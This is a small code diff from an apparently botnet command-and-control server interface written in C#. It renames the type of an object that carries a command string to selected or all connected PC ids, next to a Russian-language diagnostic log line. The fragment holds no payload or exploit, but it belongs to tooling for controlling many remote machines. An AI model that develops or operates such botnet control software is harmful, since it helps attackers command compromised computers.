@@ -183,7 +183,7 @@ namespace BotNet_Server_UI
                     command += "^" + item.Text;
                 }
                 m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow / Send_Command event) Заданная команда {command} / {showcommand}\r\n";
-                Message message = new Message()
+                Command message = new Command()
                 {
                     command = command,
                     ids = ipsall ? arr.Where(x => x.nameofpc != string.Empty).Select(x => x.id.ToString()).ToArray() : ips
